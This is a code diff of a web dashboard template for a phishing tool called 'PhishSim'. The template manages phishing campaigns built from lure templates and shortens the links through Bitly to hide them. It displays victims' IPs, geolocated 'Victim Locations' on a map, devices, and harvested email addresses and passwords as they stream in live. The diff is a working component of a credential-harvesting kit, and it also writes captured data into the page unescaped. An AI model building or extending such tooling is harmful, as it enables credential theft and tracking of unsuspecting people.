@@ -3,173 +3,329 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Captured Data Dashboard</title>
+  <title>PhishSim Dashboard</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: #0f0f0f; color: #e0e0e0; padding: 2rem;
-    }
-    h1 { margin-bottom: 0.5rem; color: #fff; display: flex; align-items: center; gap: 10px; }
-    .live-dot {
-      display: inline-block; width: 10px; height: 10px; border-radius: 50%;
-      background: #4caf50; animation: pulse 1.5s infinite; margin-left: 8px;
-    }
-    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-    .stats {
-      display: flex; gap: 1rem; margin: 1.5rem 0; flex-wrap: wrap;
-    }
-    .stat-card {
-      background: #1a1a2e; padding: 1.5rem; border-radius: 12px; flex: 1; min-width: 140px;
-    }
-    .stat-card h3 { font-size: 2rem; color: #e94560; }
-    .stat-card p { color: #aaa; font-size: 0.85rem; }
-    .table-wrap {
-      overflow-x: auto; margin-top: 1rem; border-radius: 12px;
-    }
-    table {
-      width: 100%; border-collapse: collapse; background: #1a1a2e;
-      min-width: 900px;
-    }
-    th { background: #16213e; color: #e94560; padding: 0.85rem 0.6rem; text-align: left; font-size: 0.8rem; white-space: nowrap; }
-    td { padding: 0.7rem 0.6rem; border-bottom: 1px solid #16213e; font-size: 0.82rem; white-space: nowrap; }
-    tr:hover { background: #16213e; }
-    .badge {
-      display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem;
-    }
-    .badge-desktop { background: #0f3460; color: #4fc3f7; }
-    .badge-mobile { background: #1b5e20; color: #81c784; }
-    .badge-tablet { background: #e65100; color: #ffcc80; }
-    .flag { font-size: 1.2rem; }
-    .empty {
-      text-align: center; padding: 3rem; color: #666;
-    }
-    .toolbar { margin: 1rem 0; display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; }
-    input, button {
-      padding: 0.6rem 1rem; border: none; border-radius: 8px; font-size: 0.85rem;
-    }
-    input { background: #1a1a2e; color: #fff; flex: 1; min-width: 250px; border: 1px solid #16213e; }
-    button { background: #e94560; color: #fff; cursor: pointer; }
-    button:hover { background: #d63851; }
-    .result { margin-top: 0.5rem; color: #81c784; font-size: 0.85rem; word-break: break-all; }
-    .toast {
-      position: fixed; bottom: 20px; right: 20px; background: #1a1a2e; border-left: 4px solid #4caf50;
-      padding: 1rem; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-      transform: translateY(100px); opacity: 0; transition: all 0.4s ease; z-index: 999;
-    }
-    .toast.show { transform: translateY(0); opacity: 1; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0f; color:#e0e0e0; }
+    .header { background:#12121a; padding:1rem 2rem; border-bottom:1px solid #1e1e2e; display:flex; justify-content:space-between; align-items:center; }
+    .header h1 { font-size:1.3rem; color:#fff; display:flex; align-items:center; gap:8px; }
+    .live-badge { display:inline-flex; align-items:center; gap:5px; background:#1a3a1a; color:#4caf50; padding:3px 10px; border-radius:12px; font-size:0.7rem; }
+    .live-badge .dot { width:6px; height:6px; border-radius:50%; background:#4caf50; animation:pulse 1.5s infinite; }
+    @keyframes pulse { 0%{opacity:1}50%{opacity:0.3}100%{opacity:1} }
+    .container { padding:1.5rem 2rem; max-width:1600px; margin:0 auto; }
+    .stats-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:1rem; margin-bottom:1.5rem; }
+    .stat { background:#12121a; border:1px solid #1e1e2e; border-radius:12px; padding:1.2rem; }
+    .stat h3 { font-size:1.8rem; color:#e94560; }
+    .stat p { font-size:0.75rem; color:#888; text-transform:uppercase; letter-spacing:0.5px; }
+    .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; margin-bottom:1.5rem; }
+    .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:1.5rem; margin-bottom:1.5rem; }
+    .card { background:#12121a; border:1px solid #1e1e2e; border-radius:12px; padding:1.2rem; }
+    .card h2 { font-size:0.85rem; color:#aaa; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:0.8rem; }
+    #map { height:350px; border-radius:8px; }
+    canvas { max-height:200px; }
+    .toolbar { display:flex; gap:0.8rem; margin-bottom:1rem; flex-wrap:wrap; align-items:center; }
+    input, select, button { padding:0.55rem 0.9rem; border:1px solid #1e1e2e; border-radius:8px; font-size:0.85rem; background:#12121a; color:#e0e0e0; }
+    input:focus, select:focus { outline:none; border-color:#e94560; }
+    button { background:#e94560; color:#fff; border:none; cursor:pointer; font-weight:600; }
+    button:hover { background:#d63851; }
+    button.sec { background:transparent; border:1px solid #333; }
+    button.sec:hover { border-color:#e94560; }
+    .table-wrap { overflow-x:auto; border-radius:8px; }
+    table { width:100%; border-collapse:collapse; font-size:0.8rem; }
+    th { background:#1a1a2a; color:#e94560; padding:0.7rem 0.5rem; text-align:left; white-space:nowrap; }
+    td { padding:0.6rem 0.5rem; border-bottom:1px solid #1a1a2a; white-space:nowrap; }
+    tr:hover { background:#1a1a2a; }
+    .badge { padding:2px 8px; border-radius:4px; font-size:0.7rem; }
+    .badge-desktop { background:#0f3460; color:#4fc3f7; }
+    .badge-mobile { background:#1b5e20; color:#81c784; }
+    .badge-tablet { background:#e65100; color:#ffcc80; }
+    .flag { font-size:1.1rem; }
+    .toast { position:fixed; bottom:20px; right:20px; background:#1a1a2e; border-left:4px solid #4caf50; padding:1rem; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,0.5); transform:translateY(100px); opacity:0; transition:all 0.4s ease; z-index:9999; max-width:350px; }
+    .toast.show { transform:translateY(0); opacity:1; }
+    .cmp-card { background:#12121a; border:1px solid #1e1e2e; border-radius:8px; padding:1rem; display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem; }
+    .cmp-card .info { flex:1; }
+    .cmp-card .info strong { display:block; color:#fff; }
+    .cmp-card .info span { font-size:0.75rem; color:#888; }
+    .cmp-card .stats { display:flex; gap:1rem; margin:0 1rem; }
+    .cmp-card .stats div { text-align:center; }
+    .cmp-card .stats div b { display:block; color:#e94560; font-size:1.1rem; }
+    .cmp-card .stats div small { font-size:0.65rem; color:#888; }
+    .link-input { display:flex; gap:0.5rem; }
+    .link-input input { flex:1; min-width:200px; }
+    .result-box { margin-top:0.5rem; padding:0.5rem; background:#0a0a0f; border-radius:6px; font-size:0.8rem; word-break:break-all; }
+    .result-box a { color:#4fc3f7; }
+    .tab-bar { display:flex; gap:0; margin-bottom:1.5rem; border-bottom:1px solid #1e1e2e; }
+    .tab-bar button { background:transparent; border:none; border-bottom:2px solid transparent; border-radius:0; padding:0.6rem 1.2rem; color:#888; cursor:pointer; }
+    .tab-bar button.active { color:#e94560; border-bottom-color:#e94560; }
+    .tab { display:none; }
+    .tab.active { display:block; }
+    .delete-btn { background:transparent; border:1px solid #dc3545; color:#dc3545; padding:0.3rem 0.6rem; font-size:0.75rem; border-radius:4px; cursor:pointer; }
+    .delete-btn:hover { background:#dc3545; color:#fff; }
+    @media (max-width:900px) { .grid-2, .grid-3 { grid-template-columns:1fr; } }
   </style>
 </head>
 <body>
-  <h1>Captured Data Dashboard <span class="live-dot"></span><span style="font-size:0.8rem;color:#4caf50;font-weight:normal;">LIVE</span></h1>
-  <p style="color:#aaa;">New captures appear in real-time. Geolocation via ip-api.com</p>
-
-  <div class="stats">
-    <div class="stat-card">
-      <h3 id="totalCount"><%= count %></h3>
-      <p>Total Captures</p>
-    </div>
-    <div class="stat-card">
-      <h3 id="uniqueIPs"><%= [...new Set(captures.map(c => c.ip))].length %></h3>
-      <p>Unique IPs</p>
-    </div>
-    <div class="stat-card">
-      <h3 id="uniqueCountries"><%= [...new Set(captures.map(c => c.country))].length %></h3>
-      <p>Countries</p>
+  <div class="header">
+    <h1><span style="color:#e94560;">Phish</span>Sim <span class="live-badge"><span class="dot"></span> LIVE</span></h1>
+    <div style="display:flex;gap:0.5rem;align-items:center;">
+      <a href="/api/captures/export/csv" style="color:#888;font-size:0.8rem;">Export CSV</a>
+      <a href="/api/captures/export/json" style="color:#888;font-size:0.8rem;margin-right:0.5rem;">Export JSON</a>
+      <span style="color:#555;font-size:0.75rem;" id="liveCount"><%= count %> captures</span>
     </div>
   </div>
 
-  <div class="toolbar">
-    <input type="url" id="urlInput" placeholder="Enter a URL to shorten with Bitly..." />
-    <button onclick="shortenURL()">Shorten with Bitly</button>
-  </div>
-  <div id="result" class="result"></div>
+  <div class="container">
+    <div class="tab-bar">
+      <button class="active" onclick="switchTab('dashboard')">Dashboard</button>
+      <button onclick="switchTab('campaigns')">Campaigns</button>
+    </div>
 
-  <% if (captures.length === 0) { %>
-    <div class="empty" id="emptyMsg">No captures yet. Share your Bitly link and wait for visits.</div>
-  <% } %>
+    <!-- ═══ DASHBOARD TAB ═══ -->
+    <div id="tab-dashboard" class="tab active">
+      <div class="stats-row">
+        <div class="stat"><h3 id="statTotal"><%= count %></h3><p>Total Captures</p></div>
+        <div class="stat"><h3 id="statIPs"><%= [...new Set(captures.map(c=>c.ip))].length %></h3><p>Unique IPs</p></div>
+        <div class="stat"><h3 id="statCountries"><%= [...new Set(captures.map(c=>c.country))].length %></h3><p>Countries</p></div>
+        <div class="stat"><h3 id="statCampaigns"><%= campaigns.length %></h3><p>Campaigns</p></div>
+        <div class="stat"><h3 id="statCreds"><%= captures.filter(c=>c.email).length %></h3><p>Credentials</p></div>
+      </div>
 
-  <div class="table-wrap" id="tableWrap" <%= captures.length === 0 ? 'style="display:none"' : '' %>>
-    <table>
-      <thead>
-        <tr>
-          <th>Time</th>
-          <th>IP Address</th>
-          <th>Location</th>
-          <th>OS</th>
-          <th>Browser</th>
-          <th>Device</th>
-          <th>Referer</th>
-        </tr>
-      </thead>
-      <tbody id="capturesBody">
-        <% captures.slice().reverse().forEach(c => { %>
-          <tr>
-            <td><%= new Date(c.timestamp).toLocaleString() %></td>
-            <td><%= c.ip %></td>
-            <td><span class="flag"><%= c.flag || '🌍' %></span> <%= c.city %>, <%= c.country %></td>
-            <td><%= c.os %></td>
-            <td><%= c.browser %></td>
-            <td><span class="badge badge-<%= c.device %>"><%= c.device %></span></td>
-            <td><%= c.referer %></td>
-          </tr>
-        <% }); %>
-      </tbody>
-    </table>
+      <div class="grid-2">
+        <div class="card">
+          <h2>Victim Locations</h2>
+          <div id="map"></div>
+        </div>
+        <div class="card">
+          <h2>Timeline</h2>
+          <canvas id="timelineChart"></canvas>
+        </div>
+      </div>
+
+      <div class="grid-3">
+        <div class="card"><h2>By Template</h2><canvas id="templateChart"></canvas></div>
+        <div class="card"><h2>By OS</h2><canvas id="osChart"></canvas></div>
+        <div class="card"><h2>By Device</h2><canvas id="deviceChart"></canvas></div>
+      </div>
+
+      <div class="card">
+        <h2>Captures <span style="color:#555;font-weight:normal;font-size:0.7rem;">LIVE</span></h2>
+        <div class="table-wrap">
+          <table>
+            <thead><tr>
+              <th>Time</th><th>IP</th><th>Location</th><th>OS</th><th>Browser</th><th>Device</th><th>Campaign</th><th>Email</th><th>Password</th>
+            </tr></thead>
+            <tbody id="capturesBody">
+              <% captures.forEach(c => { %>
+                <tr>
+                  <td><%= new Date(c.timestamp).toLocaleString() %></td>
+                  <td style="color:#4fc3f7"><%= c.ip %></td>
+                  <td><span class="flag"><%= c.flag||'🌍' %></span> <%= c.city||'?' %>, <%= c.country||'?' %></td>
+                  <td><%= c.os %></td>
+                  <td><%= c.browser %></td>
+                  <td><span class="badge badge-<%= c.device %>"><%= c.device %></span></td>
+                  <td><%= c.campaignName||'-' %></td>
+                  <td style="color:#81c784"><%= c.email||'-' %></td>
+                  <td style="color:#e94560"><%= c.password ? '••••' : '-' %></td>
+                </tr>
+              <% }) %>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ CAMPAIGNS TAB ═══ -->
+    <div id="tab-campaigns" class="tab">
+      <div class="card" style="margin-bottom:1rem;">
+        <h2>Create Campaign</h2>
+        <div style="display:flex;gap:0.5rem;flex-wrap:wrap;margin-top:0.5rem;">
+          <input type="text" id="campName" placeholder="Campaign name (e.g. Security Audit)">
+          <select id="campTemplate">
+            <% Object.keys(templates).forEach(t => { %>
+              <option value="<%= t %>"><%= templates[t].icon %> <%= templates[t].name %></option>
+            <% }) %>
+          </select>
+          <button onclick="createCampaign()">Create Campaign</button>
+        </div>
+        <div id="campResult" class="result-box"></div>
+      </div>
+
+      <div id="campaignList">
+        <% campaigns.slice().reverse().forEach(c => { %>
+          <div class="cmp-card">
+            <div class="info">
+              <strong><%= templates[c.template]?.icon||'🔗' %> <%= c.name %></strong>
+              <span><%= c.template %> • <%= new Date(c.created).toLocaleDateString() %></span>
+            </div>
+            <div class="stats">
+              <div><b><%= c.clicks||0 %></b><small>Clicks</small></div>
+              <div><b><%= c.captures||0 %></b><small>Captures</small></div>
+            </div>
+            <div style="display:flex;gap:0.3rem;">
+              <button class="sec" onclick="copyLink('<%= c.id %>')" style="font-size:0.7rem;">Copy Link</button>
+              <button class="delete-btn" onclick="deleteCampaign('<%= c.id %>')">Delete</button>
+            </div>
+          </div>
+        <% }) %>
+      </div>
+    </div>
   </div>
 
   <div id="toast" class="toast"></div>
 
   <script>
-    async function shortenURL() {
-      const url = document.getElementById('urlInput').value;
-      const resultDiv = document.getElementById('result');
-      if (!url) { resultDiv.textContent = 'Please enter a URL.'; return; }
-      try {
-        const res = await fetch('/api/shorten', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ url })
+    let map, markers = [], templateChart, osChart, deviceChart, timelineChart;
+
+    // ── Tabs ──
+    function switchTab(name) {
+      document.querySelectorAll('.tab-bar button').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelector(`.tab-bar button:nth-child(${name==='dashboard'?1:2})`).classList.add('active');
+      document.getElementById(`tab-${name}`).classList.add('active');
+      if (name === 'dashboard') setTimeout(() => { map?.invalidateSize(); updateCharts(); }, 100);
+    }
+
+    // ── Map ──
+    function initMap() {
+      map = L.map('map').setView([20, 0], 2);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:18 }).addTo(map);
+    }
+
+    function addMarker(c) {
+      if (!c.lat || !c.lon || (c.lat === 0 && c.lon === 0)) return;
+      const color = c.email ? '#e94560' : '#4fc3f7';
+      const marker = L.circleMarker([c.lat, c.lon], { radius:6, color, fillColor:color, fillOpacity:0.7, weight:1 })
+        .addTo(map)
+        .bindPopup(`<b>${c.city}, ${c.country}</b><br>${c.os}<br>${c.email ? '✉ '+c.email : ''}`);
+      markers.push(marker);
+    }
+
+    // ── Charts ──
+    async function updateCharts() {
+      const res = await fetch('/api/stats');
+      const d = await res.json();
+      if (!d) return;
+
+      if (templateChart) templateChart.destroy();
+      if (osChart) osChart.destroy();
+      if (deviceChart) deviceChart.destroy();
+      if (timelineChart) timelineChart.destroy();
+
+      const ctx = document.createElement('canvas').getContext('2d');
+      const colors = ['#e94560','#4fc3f7','#81c784','#ffcc80','#ce93d8','#64b5f6'];
+
+      if (d.byTemplate.entries?.length) {
+        templateChart = new Chart(document.getElementById('templateChart'), {
+          type:'doughnut', data:{ labels:d.byTemplate.entries.map(e=>e.name), datasets:[{ data:d.byTemplate.entries.map(e=>e.count), backgroundColor:colors }] },
+          options:{ responsive:true, plugins:{ legend:{ display:false } } }
         });
-        const data = await res.json();
-        if (data.link) {
-          resultDiv.innerHTML = 'Shortened URL: <a href="' + data.link + '" target="_blank">' + data.link + '</a>';
-        } else {
-          resultDiv.textContent = 'Error: ' + (data.error || 'Unknown error');
-        }
-      } catch (err) {
-        resultDiv.textContent = 'Error: ' + err.message;
+      }
+      if (d.byOS.entries?.length) {
+        osChart = new Chart(document.getElementById('osChart'), {
+          type:'bar', data:{ labels:d.byOS.entries.map(e=>e.name), datasets:[{ label:'', data:d.byOS.entries.map(e=>e.count), backgroundColor:'#4fc3f7' }] },
+          options:{ responsive:true, plugins:{ legend:{ display:false } }, scales:{ y:{ beginAtZero:true, grid:{ color:'#1e1e2e' } }, x:{ grid:{ display:false } } } }
+        });
+      }
+      deviceChart = new Chart(document.getElementById('deviceChart'), {
+        type:'doughnut', data:{ labels:Object.keys(d.byDevice), datasets:[{ data:Object.values(d.byDevice), backgroundColor:['#4fc3f7','#81c784','#ffcc80'] }] },
+        options:{ responsive:true, plugins:{ legend:{ position:'bottom', labels:{ color:'#888', boxWidth:10 } } } }
+      });
+      if (d.timeline?.length) {
+        const sorted = d.timeline.sort((a,b)=>a.date.localeCompare(b.date));
+        timelineChart = new Chart(document.getElementById('timelineChart'), {
+          type:'line', data:{ labels:sorted.map(e=>e.date.slice(5)), datasets:[{ label:'', data:sorted.map(e=>e.count), borderColor:'#e94560', backgroundColor:'rgba(233,69,96,0.1)', fill:true, tension:0.3, pointRadius:3 }] },
+          options:{ responsive:true, plugins:{ legend:{ display:false } }, scales:{ y:{ beginAtZero:true, grid:{ color:'#1e1e2e' } }, x:{ grid:{ display:false } } } }
+        });
       }
     }
 
+    // ── SSE Live Updates ──
     const source = new EventSource('/api/live');
-    source.onmessage = function(event) {
-      const data = JSON.parse(event.data);
-      if (data.type === 'connected') return;
+    source.addEventListener('capture', e => addRow(JSON.parse(e.data), false));
+    source.addEventListener('credential', e => addRow(JSON.parse(e.data), true));
+    source.addEventListener('connected', () => {});
 
+    function addRow(data, hasCreds) {
       const row = document.createElement('tr');
       row.innerHTML =
-        '<td>' + new Date(data.timestamp).toLocaleString() + '</td>' +
-        '<td>' + data.ip + '</td>' +
-        '<td><span class="flag">' + (data.flag || '\u{1F30D}') + '</span> ' + data.city + ', ' + data.country + '</td>' +
-        '<td>' + data.os + '</td>' +
-        '<td>' + data.browser + '</td>' +
-        '<td><span class="badge badge-' + data.device + '">' + data.device + '</span></td>' +
-        '<td>' + data.referer + '</td>';
+        '<td>'+new Date(data.timestamp).toLocaleString()+'</td>'+
+        '<td style="color:#4fc3f7">'+data.ip+'</td>'+
+        '<td><span class="flag">'+(data.flag||'🌍')+'</span> '+(data.city||'?')+', '+(data.country||'?')+'</td>'+
+        '<td>'+data.os+'</td>'+
+        '<td>'+data.browser+'</td>'+
+        '<td><span class="badge badge-'+data.device+'">'+data.device+'</span></td>'+
+        '<td>'+(data.campaignName||'-')+'</td>'+
+        '<td style="color:#81c784">'+(data.email||'-')+'</td>'+
+        '<td style="color:#e94560">'+(data.password ? '••••' : '-')+'</td>';
+      document.getElementById('capturesBody').prepend(row);
 
-      const tbody = document.getElementById('capturesBody');
-      tbody.insertBefore(row, tbody.firstChild);
+      addMarker(data);
 
-      document.getElementById('emptyMsg')?.remove();
-      document.getElementById('tableWrap').style.display = '';
+      document.getElementById('statTotal').textContent = parseInt(document.getElementById('statTotal').textContent) + 1;
+      if (hasCreds) {
+        document.getElementById('statCreds').textContent = parseInt(document.getElementById('statCreds').textContent) + 1;
+      }
 
-      document.getElementById('totalCount').textContent = parseInt(document.getElementById('totalCount').textContent) + 1;
+      showToast(`New ${hasCreds?'credential':'visit'} from ${data.city}, ${data.country}`);
+      updateCharts();
+    }
 
-      const toast = document.getElementById('toast');
-      toast.innerHTML = '<strong>New capture!</strong><br>' + data.city + ', ' + data.country + ' - ' + data.os;
-      toast.classList.add('show');
-      setTimeout(() => toast.classList.remove('show'), 3000);
-    };
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.innerHTML = '<strong>'+msg+'</strong>';
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 3000);
+    }
+
+    // ── Campaigns ──
+    async function createCampaign() {
+      const name = document.getElementById('campName').value;
+      const template = document.getElementById('campTemplate').value;
+      if (!name) return showToast('Enter a campaign name');
+      try {
+        const res = await fetch('/api/campaigns', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name,template}) });
+        const data = await res.json();
+        if (data.id) {
+          document.getElementById('campResult').innerHTML =
+            'Phishing link: <a href="'+data.link+'" target="_blank">'+data.link+'</a><br>'+
+            'Shorten with Bitly using the box below!';
+          location.reload();
+        }
+      } catch(e) { showToast('Error: '+e.message); }
+    }
+
+    async function deleteCampaign(id) {
+      if (!confirm('Delete this campaign and its captures?')) return;
+      await fetch('/api/campaigns/'+id, { method:'DELETE' });
+      location.reload();
+    }
+
+    function copyLink(id) {
+      const url = window.location.origin + '/c/' + id;
+      navigator.clipboard?.writeText(url).then(() => showToast('Link copied!')).catch(() => prompt('Copy link:', url));
+    }
+
+    // ── Bitly Shortener (in campaigns tab) ──
+    async function shortenURL() {
+      const url = document.getElementById('urlInput').value;
+      const r = document.getElementById('result');
+      if (!url) { r.textContent = 'Enter a URL'; return; }
+      try {
+        const res = await fetch('/api/shorten', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url}) });
+        const d = await res.json();
+        r.innerHTML = d.link ? 'Shortened: <a href="'+d.link+'" target="_blank">'+d.link+'</a>' : 'Error: '+(d.error||'?');
+      } catch(e) { r.textContent = 'Error: '+e.message; }
+    }
+
+    // ── Init ──
+    document.addEventListener('DOMContentLoaded', () => {
+      initMap();
+      <% captures.forEach(c => { %>addMarker(<%= JSON.stringify(c) %>);<% }) %>
+      updateCharts();
+    });
   </script>
 </body>
 </html>
